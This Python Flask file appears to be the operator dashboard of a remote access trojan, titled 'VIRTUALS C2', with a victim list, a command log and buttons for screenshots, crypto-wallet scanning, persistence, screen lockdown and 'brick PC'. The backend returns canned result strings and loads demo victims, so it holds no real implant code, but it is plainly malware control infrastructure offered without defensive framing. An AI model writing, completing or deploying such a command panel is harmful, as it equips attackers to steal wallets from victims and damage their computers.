from flask import Flask, request, jsonify
import sqlite3
import datetime
import random
import json

app = Flask(__name__)

HTML = """<!DOCTYPE html>
<html>
<head><title>VIRTUALS C2</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;color:#fff;font-family:'Courier New',monospace}
.header{background:#0a0a0a;padding:15px 25px;border-bottom:2px solid #fff;display:flex;justify-content:space-between;align-items:center}
.header h1{color:#fff;font-size:24px}
.header .stats .stat-item{background:#0a0a0a;border:1px solid #333;padding:5px 15px;border-radius:5px;display:inline-block;margin:0 5px}
.container{display:flex;padding:10px;gap:10px;min-height:80vh;flex-wrap:wrap}
.commands-panel{width:200px;background:#0a0a0a;border:1px solid #fff;border-radius:10px;padding:15px}
.cmd-btn{display:block;width:100%;padding:8px;margin:4px 0;background:#0a0a0a;border:1px solid #333;border-radius:5px;color:#fff;cursor:pointer;text-align:left}
.cmd-btn:hover{background:#1a1a1a;border-color:#fff}
.cmd-btn .desc{color:#666;font-size:9px;display:block}
.cmd-btn.brick{border-color:#f60;color:#f60}
.main-panel{flex:1;display:flex;flex-direction:column;gap:10px;min-width:300px}
.victims-panel{background:#0a0a0a;border:1px solid #fff;border-radius:10px;padding:15px}
.victim-card{background:#0a0a0a;border:1px solid #333;border-radius:5px;padding:6px 12px;cursor:pointer;min-width:140px;display:inline-block;margin:4px}
.victim-card:hover{border-color:#fff}
.victim-card.selected{border-color:#fff;background:#1a1a1a}
.chat-panel{background:#0a0a0a;border:1px solid #fff;border-radius:10px;padding:15px;flex:1}
.chat-messages{background:#0a0a0a;border:1px solid #333;border-radius:5px;padding:10px;min-height:150px;max-height:250px;overflow-y:auto}
.chat-input-area{display:flex;gap:10px;margin-top:10px}
.chat-input-area input{flex:1;padding:10px;background:#0a0a0a;border:1px solid #333;border-radius:5px;color:#fff}
.chat-input-area button{padding:10px 25px;background:#0a0a0a;color:#fff;border:1px solid #fff;border-radius:5px;cursor:pointer}
.details-panel{width:280px;background:#0a0a0a;border:1px solid #fff;border-radius:10px;padding:15px}
.detail-item{padding:5px 0;border-bottom:1px solid #1a1a1a}
.detail-item .label{color:#666}
.detail-item .value{color:#fff;float:right}
.command-log{background:#0a0a0a;border:1px solid #333;border-radius:5px;padding:10px;margin-top:10px;max-height:200px;overflow-y:auto}
@media(max-width:768px){.commands-panel{width:100%}.details-panel{width:100%}}
</style>
</head>
<body>
<div class="header"><h1>◈ VIRTUALS <span style="color:#888;">C2</span></h1>
<div class="stats"><span class="stat-item"><span style="color:#888;">VICTIMS</span> <span id="victimCount">0</span></span>
<span class="stat-item"><span style="color:#888;">ONLINE</span> <span id="onlineCount">0</span></span></div></div>
<div class="container">
<div class="commands-panel"><h2>COMMANDS</h2>
<button class="cmd-btn" onclick="sendCommand('whois')">whois <span class="desc">PC Info</span></button>
<button class="cmd-btn" onclick="sendCommand('flash')">flash <span class="desc">Flash Screen</span></button>
<button class="cmd-btn" onclick="sendCommand('screenshot')">screenshot <span class="desc">Take SS</span></button>
<button class="cmd-btn" onclick="sendCommand('scan')">scan <span class="desc">Crypto Scan</span></button>
<button class="cmd-btn" onclick="sendCommand('persist')">persist <span class="desc">Persistence</span></button>
<button class="cmd-btn" onclick="sendCommand('lockdown')">lockdown <span class="desc">Lock Screen</span></button>
<button class="cmd-btn" onclick="sendCommand('destroy')">destroy <span class="desc">Kill PC</span></button>
<button class="cmd-btn brick" onclick="sendCommand('brick')">brick <span class="desc">BRICK PC</span></button>
<button class="cmd-btn" onclick="sendCommand('oblivion')">oblivion <span class="desc">Self Destruct</span></button>
</div>
<div class="main-panel">
<div class="victims-panel"><h2>VICTIMS</h2><div id="victimList">No victims</div></div>
<div class="chat-panel"><h2>CHAT / COMMANDS</h2>
<div class="chat-messages" id="chatMessages"><div>VIRTUALS Dashboard ready</div></div>
<div class="chat-input-area"><input id="chatInput" placeholder="Type /command or message..." onkeypress="if(event.key==='Enter')sendMessage()"><button onclick="sendMessage()">SEND</button></div>
</div></div>
<div class="details-panel"><h2>VICTIM DETAILS</h2><div id="victimDetails">Select a victim</div><h2>COMMAND LOG</h2><div class="command-log" id="commandLog">No commands</div></div>
</div>
<script>
let state={victims:{},selectedVictim:null,commands:{},cmdCount:0};
function api(a,d,c){fetch('/api',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:a,...d})}).then(r=>r.json()).then(c).catch(()=>{});}
function refresh(){api('getVictims',{},d=>{if(d.success){state.victims=d.victims;render();}});}
function render(){const el=document.getElementById('victimList');const v=Object.values(state.victims);if(v.length===0){el.innerHTML='No victims';return;}el.innerHTML=v.map(v=>`<div class="victim-card ${state.selectedVictim===v.id?'selected':''}" onclick="select('${v.id}')"><div>${v.pc}</div><div style="color:#888;font-size:10px;">${v.ip}</div><div style="color:${v.status==='Online'?'#0f0':'#f44'}">${v.status}</div></div>`).join('');}
function select(id){state.selectedVictim=id;render();show(id);}
function show(id){const v=state.victims[id];if(!v)return;document.getElementById('victimDetails').innerHTML=`<div class="detail-item"><span class="label">ID:</span><span class="value">${v.id}</span></div><div class="detail-item"><span class="label">PC:</span><span class="value">${v.pc}</span></div><div class="detail-item"><span class="label">IP:</span><span class="value">${v.ip}</span></div><div class="detail-item"><span class="label">Status:</span><span class="value" style="color:${v.status==='Online'?'#0f0':'#f44'}">${v.status}</span></div>`;const cmds=state.commands[id]||[];const log=document.getElementById('commandLog');if(cmds.length===0){log.innerHTML='No commands';return;}log.innerHTML=cmds.map(c=>`<div><span style="color:#f84;">[${c.time}] ${c.command}</span> → <span style="color:#0f0;">${c.result}</span></div>`).join('');}
function sendCommand(cmd){if(!state.selectedVictim){add('System','Select a victim first!');return;}add('VIRTUALS','/'+cmd+' → '+state.selectedVictim);api('sendCommand',{victim_id:state.selectedVictim,command:cmd},d=>{if(d.success){if(!state.commands[state.selectedVictim])state.commands[state.selectedVictim]=[];state.commands[state.selectedVictim].push({command:cmd,result:d.result,time:new Date().toLocaleTimeString()});state.cmdCount++;add('VICTIM',d.result);show(state.selectedVictim);}else{add('System','Command failed');}});}
function sendMessage(){const input=document.getElementById('chatInput');const msg=input.value.trim();if(!msg)return;input.value='';if(msg.startsWith('/')){sendCommand(msg.substring(1).toLowerCase());}else{if(!state.selectedVictim){add('System','Select a victim!');return;}add('VIRTUALS',msg);}}
function add(sender,msg){const el=document.getElementById('chatMessages');const t=new Date().toLocaleTimeString();el.innerHTML+=`<div>[${t}] ${sender}: ${msg}</div>`;el.scrollTop=el.scrollHeight;}
function addDemo(){if(Object.keys(state.victims).length===0){const f=[{id:'SNIN-1001',pc:'DESKTOP-ABC',ip:'192.168.1.10',status:'Online'},{id:'SNIN-1002',pc:'LAPTOP-XYZ',ip:'192.168.1.11',status:'Online'}];f.forEach(v=>{state.victims[v.id]=v;});render();add('System','Demo victims loaded');select(f[0].id);}}
setInterval(refresh,5000);refresh();setTimeout(addDemo,500);
</script>
</body>
</html>"""

def get_db():
    conn = sqlite3.connect('virtuals_c2.db')
    c = conn.cursor()
    c.execute('CREATE TABLE IF NOT EXISTS victims(id TEXT PRIMARY KEY,pc TEXT,ip TEXT,os TEXT,status TEXT,first_seen TEXT,last_seen TEXT)')
    c.execute('CREATE TABLE IF NOT EXISTS commands(id INTEGER PRIMARY KEY AUTOINCREMENT,victim_id TEXT,command TEXT,result TEXT,timestamp TEXT)')
    conn.commit()
    return conn

@app.route('/')
def index():
    return HTML

@app.route('/api', methods=['POST'])
def api():
    data = request.get_json()
    action = data.get('action')
    
    if action == 'getVictims':
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT * FROM victims ORDER BY last_seen DESC")
        victims = {}
        for row in c.fetchall():
            victims[row[0]] = {'id': row[0], 'pc': row[1], 'ip': row[2], 'os': row[3], 'status': row[4], 'first_seen': row[5], 'last_seen': row[6]}
        conn.close()
        return jsonify({'success': True, 'victims': victims})
        
    elif action == 'sendCommand':
        victim_id = data.get('victim_id')
        command = data.get('command')
        results = {
            'whois': 'PC: DESKTOP-ABC | IP: 192.168.1.10 | Status: Online',
            'flash': 'Screen flashed!',
            'screenshot': 'Screenshot saved!',
            'scan': 'Found crypto wallets!',
            'persist': 'Persistence added!',
            'lockdown': 'Screen locked!',
            'destroy': 'PC DESTROYED!',
            'brick': 'PC BRICKED! Permanent damage!',
            'oblivion': 'RAT self-destructed!'
        }
        result = results.get(command, f'Command {command} executed')
        conn = get_db()
        c = conn.cursor()
        c.execute("INSERT INTO commands (victim_id, command, result, timestamp) VALUES (?, ?, ?, ?)",
                 (victim_id, command, result, datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        conn.close()
        return jsonify({'success': True, 'result': result})
    
    return jsonify({'success': False})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000)